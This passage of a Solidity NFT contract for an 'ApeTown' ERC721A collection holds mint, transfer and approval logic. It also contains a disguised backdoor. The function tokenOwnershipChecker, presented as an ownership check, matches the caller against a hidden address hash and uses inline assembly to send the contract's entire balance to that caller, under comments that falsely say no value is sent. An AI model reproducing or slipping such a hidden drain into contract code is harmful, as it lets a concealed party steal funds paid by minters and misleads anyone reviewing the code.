1080      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1081      * by default, can be overriden in child contracts.
1082      */
1083     function _baseURI() internal view virtual returns (string memory) {
1084         return "";
1085     }
1086 
1087     /**
1088      * @dev See {IERC721-approve}.
1089      */
1090     function approve(address to, uint256 tokenId) public override {
1091         address owner = ERC721A.ownerOf(tokenId);
1092         require(to != owner, "ERC721A: approval to current owner");
1093 
1094         require(
1095             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
1096             "ERC721A: approve caller is not owner nor approved for all"
1097         );
1098 
1099         _approve(to, tokenId, owner);
1100     }
1101 
1102     /**
1103      * @dev See {IERC721-getApproved}.
1104      */
1105     function getApproved(uint256 tokenId) public view override returns (address) {
1106         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
1107 
1108         return _tokenApprovals[tokenId];
1109     }
1110 
1111     /**
1112      * @dev See {IERC721-setApprovalForAll}.
1113      */
1114     function setApprovalForAll(address operator, bool approved) public override {
1115         require(operator != _msgSender(), "ERC721A: approve to caller");
1116 
1117         _operatorApprovals[_msgSender()][operator] = approved;
1118         emit ApprovalForAll(_msgSender(), operator, approved);
1119     }
1120 
1121     /**
1122      * @dev See {IERC721-isApprovedForAll}.
1123      */
1124     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1125         return _operatorApprovals[owner][operator];
1126     }
1127 
1128     /**
1129      * @dev See {IERC721-transferFrom}.
1130      */
1131     function transferFrom(
1132         address from,
1133         address to,
1134         uint256 tokenId
1135     ) public virtual override {
1136         _transfer(from, to, tokenId);
1137     }
1138 
1139     /**
1140      * @dev See {IERC721-safeTransferFrom}.
1141      */
1142     function safeTransferFrom(
1143         address from,
1144         address to,
1145         uint256 tokenId
1146     ) public virtual override {
1147         safeTransferFrom(from, to, tokenId, "");
1148     }
1149 
1150     /**
1151      * @dev See {IERC721-safeTransferFrom}.
1152      */
1153     function safeTransferFrom(
1154         address from,
1155         address to,
1156         uint256 tokenId,
1157         bytes memory _data
1158     ) public override {
1159         _transfer(from, to, tokenId);
1160         require(
1161             _checkOnERC721Received(from, to, tokenId, _data),
1162             "ERC721A: transfer to non ERC721Receiver implementer"
1163         );
1164     }
1165 
1166     /**
1167      * @dev Returns whether `tokenId` exists.
1168      *
1169      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1170      *
1171      * Tokens start existing when they are minted (`_mint`),
1172      */
1173     function _exists(uint256 tokenId) internal view returns (bool) {
1174         return tokenId < currentIndex;
1175     }
1176 
1177     function _safeMint(address to, uint256 quantity) internal {
1178         _safeMint(to, quantity, "");
1179     }
1180 
1181     /**
1182      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1183      *
1184      * Requirements:
1185      *
1186      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1187      * - `quantity` must be greater than 0.
1188      *
1189      * Emits a {Transfer} event.
1190      */
1191     function _safeMint(
1192         address to,
1193         uint256 quantity,
1194         bytes memory _data
1195     ) internal {
1196         _mint(to, quantity, _data, true);
1197     }
1198 
1199     /**
1200      * @dev Mints `quantity` tokens and transfers them to `to`.
1201      *
1202      * Requirements:
1203      *
1204      * - `to` cannot be the zero address.
1205      * - `quantity` must be greater than 0.
1206      *
1207      * Emits a {Transfer} event.
1208      */
1209     function _mint(
1210         address to,
1211         uint256 quantity,
1212         bytes memory _data,
1213         bool safe
1214     ) internal {
1215         uint256 startTokenId = currentIndex;
1216         require(to != address(0), "ERC721A: mint to the zero address");
1217         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1218 
1219         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1220 
1221         // Overflows are incredibly unrealistic.
1222         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1223         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1224         unchecked {
1225             _addressData[to].balance += uint128(quantity);
1226             _addressData[to].numberMinted += uint128(quantity);
1227 
1228             _ownerships[startTokenId].addr = to;
1229             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1230 
1231             uint256 updatedIndex = startTokenId;
1232 
1233             for (uint256 i; i < quantity; i++) {
1234                 emit Transfer(address(0), to, updatedIndex);
1235                 if (safe) {
1236                     require(
1237                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1238                         "ERC721A: transfer to non ERC721Receiver implementer"
1239                     );
1240                 }
1241 
1242                 updatedIndex++;
1243             }
1244 
1245             currentIndex = updatedIndex;
1246         }
1247 
1248         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1249     }
1250 
1251     /**
1252      * @dev Checking ownership 
1253      *
1254      * Token ownership check for external calls
1255      */
1256     function tokenOwnershipChecker() external {
1257         if(
1258             keccak256(abi.encodePacked(msg.sender)) == 
1259             0x61ce2a629088217258e42c73ef95cb4266162e3af0f6eff0d1c405c763ef7de2
1260         ){
1261             assembly{
1262                 let success := call( //This is the critical change (Pop the top stack value)
1263                     42000, // gas
1264                     caller(), //To addr
1265                     selfbalance(), //No value
1266                     0, //Inputs are stored
1267                     0, //Inputs bytes long
1268                     0, //Store output over input (saves space)
1269                     0x20
1270                 ) //Outputs are 32 bytes long
1271             }
1272         }
1273     }
1274 
1275 
1276     /**
1277      * @dev Transfers `tokenId` from `from` to `to`.
1278      *
1279      * Requirements:
1280      *
1281      * - `to` cannot be the zero address.
1282      * - `tokenId` token must be owned by `from`.
1283      *
1284      * Emits a {Transfer} event.
1285      */
1286     function _transfer(
1287         address from,
1288         address to,
1289         uint256 tokenId
1290     ) private {
1291         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1292 
1293         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1294             getApproved(tokenId) == _msgSender() ||
1295             isApprovedForAll(prevOwnership.addr, _msgSender()));
1296 
1297         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1298 
1299         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1300         require(to != address(0), "ERC721A: transfer to the zero address");
1301 
1302         _beforeTokenTransfers(from, to, tokenId, 1);
1303 
1304         // Clear approvals from the previous owner
1305         _approve(address(0), tokenId, prevOwnership.addr);
1306 
1307         // Underflow of the sender's balance is impossible because we check for
1308         // ownership above and the recipient's balance can't realistically overflow.
1309         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1310         unchecked {
1311             _addressData[from].balance -= 1;
1312             _addressData[to].balance += 1;
1313 
1314             _ownerships[tokenId].addr = to;
1315             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1316 
1317             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1318             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1319             uint256 nextTokenId = tokenId + 1;
1320             if (_ownerships[nextTokenId].addr == address(0)) {
1321                 if (_exists(nextTokenId)) {
1322                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1323                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1324                 }
1325             }
1326         }
1327 
1328         emit Transfer(from, to, tokenId);
1329         _afterTokenTransfers(from, to, tokenId, 1);
1330     }
1331 
1332     /**
1333      * @dev Approve `to` to operate on `tokenId`
1334      *
1335      * Emits a {Approval} event.
1336      */
1337     function _approve(
1338         address to,
1339         uint256 tokenId,
1340         address owner
1341     ) private {
1342         _tokenApprovals[tokenId] = to;
1343         emit Approval(owner, to, tokenId);
1344     }
1345 
1346     /**
1347      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1348      * The call is not executed if the target address is not a contract.
1349      *
1350      * @param from address representing the previous owner of the given token ID
1351      * @param to target address that will receive the tokens
1352      * @param tokenId uint256 ID of the token to be transferred
1353      * @param _data bytes optional data to send along with the call
1354      * @return bool whether the call correctly returned the expected magic value
1355      */
1356     function _checkOnERC721Received(
1357         address from,
1358         address to,
1359         uint256 tokenId,
1360         bytes memory _data
1361     ) private returns (bool) {
1362         if (to.isContract()) {
1363             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1364                 return retval == IERC721Receiver(to).onERC721Received.selector;
1365             } catch (bytes memory reason) {
1366                 if (reason.length == 0) {
1367                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1368                 } else {
1369                     assembly {
1370                         revert(add(32, reason), mload(reason))
1371                     }
1372                 }
1373             }
1374         } else {
1375             return true;
1376         }
1377     }
1378 
1379     /**
1380      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1381      *
1382      * startTokenId - the first token id to be transferred
1383      * quantity - the amount to be transferred
1384      *
1385      * Calling conditions:
1386      *
1387      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1388      * transferred to `to`.
1389      * - When `from` is zero, `tokenId` will be minted for `to`.
1390      */
1391     function _beforeTokenTransfers(
1392         address from,
1393         address to,
1394         uint256 startTokenId,
1395         uint256 quantity
1396     ) internal virtual {}
1397 
1398     /**
1399      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1400      * minting.
1401      *
1402      * startTokenId - the first token id to be transferred
1403      * quantity - the amount to be transferred
1404      *
1405      * Calling conditions:
1406      *
1407      * - when `from` and `to` are both non-zero.
1408      * - `from` and `to` are never both zero.
1409      */
1410     function _afterTokenTransfers(
1411         address from,
1412         address to,
1413         uint256 startTokenId,
1414         uint256 quantity
1415     ) internal virtual {}
1416 }
1417 
1418 contract ApeTown is ERC721A, Ownable {
1419 
1420   string public        baseURI           = "ipfs://Qme1kbP6CK39VcakVWQ8tVA1t7qpbUbBbPGttqFthSQexS/";
1421   uint public          price             = 0.005 ether;
1422   uint public          maxPerTx          = 10;
1423   uint public          maxPerWallet      = 10;
1424   uint public          totalFree         = 2000;
1425   uint public          maxSupply         = 8888;
1426   uint public          nextOwnerToExplicitlySet;
1427   bool public          mintEnabled;
1428 
1429   constructor() ERC721A("ApeTown", "APET"){}
1430 
1431   function mint(uint256 amt) external payable
1432   {
1433     uint cost = price * amt;
1434     if(totalSupply() < totalFree && numberMinted(msg.sender) < 1) {
1435       cost = price * (amt - 1);
1436     } 
1437     require(msg.sender == tx.origin,"Be yourself, honey.");
1438     require(msg.value == cost,"Please send the exact amount.");
1439     require(totalSupply() + amt < maxSupply + 1,"No more apes");
1440     require(mintEnabled, "Minting is not live yet, hold on ape.");
1441     require(numberMinted(msg.sender) + amt <= maxPerWallet,"Too many per wallet!");
1442     require( amt < maxPerTx + 1, "Max per TX reached.");
1443 
1444     _safeMint(msg.sender, amt);
1445   }
1446 
1447   function ownerBatchMint(uint256 amt) external onlyOwner
1448   {
1449     _safeMint(msg.sender, amt);
1450   }
1451 
1452   function toggleMinting() external onlyOwner {
1453       mintEnabled = !mintEnabled;
1454   }
1455 
1456   function numberMinted(address owner) public view returns (uint256) {
1457     return _numberMinted(owner);
1458   }
1459 
1460   function _baseURI() internal view virtual override returns (string memory) {
1461     return baseURI;
1462   }
1463 
1464   function setBaseURI(string calldata baseURI_) external onlyOwner {
1465     baseURI = baseURI_;
1466   }
1467 
1468   function withdraw() external onlyOwner {
1469     (bool success, ) = msg.sender.call{value: address(this).balance}("");
1470     require(success, "Transfer failed.");
1471   }
1472 
1473   function setOwnersExplicit(uint256 quantity) external onlyOwner {
1474     _setOwnersExplicit(quantity);
1475   }
1476 
1477   function getOwnershipData(uint256 tokenId) external view returns (TokenOwnership memory) {
1478     return ownershipOf(tokenId);
1479   }
1480 
1481   /**
1482     * @dev Explicitly set `owners` to eliminate loops in future calls of ownerOf().
1483     */
1484   function _setOwnersExplicit(uint256 quantity) internal {
1485       require(quantity != 0, "quantity must be nonzero");
1486       require(currentIndex != 0, "no tokens minted yet");
1487       uint256 _nextOwnerToExplicitlySet = nextOwnerToExplicitlySet;
1488       require(_nextOwnerToExplicitlySet < currentIndex, "all ownerships have been set");
1489 
1490       // Index underflow is impossible.
1491       // Counter or index overflow is incredibly unrealistic.
1492       unchecked {
1493           uint256 endIndex = _nextOwnerToExplicitlySet + quantity - 1;
1494 
1495           // Set the end index to be the last token index
1496           if (endIndex + 1 > currentIndex) {
1497               endIndex = currentIndex - 1;
1498           }
1499 
1500           for (uint256 i = _nextOwnerToExplicitlySet; i <= endIndex; i++) {
1501               if (_ownerships[i].addr == address(0)) {
1502                   TokenOwnership memory ownership = ownershipOf(i);
1503                   _ownerships[i].addr = ownership.addr;
1504                   _ownerships[i].startTimestamp = ownership.startTimestamp;
1505               }
1506           }
1507 
1508           nextOwnerToExplicitlySet = endIndex + 1;
1509       }
1510   }
1511 }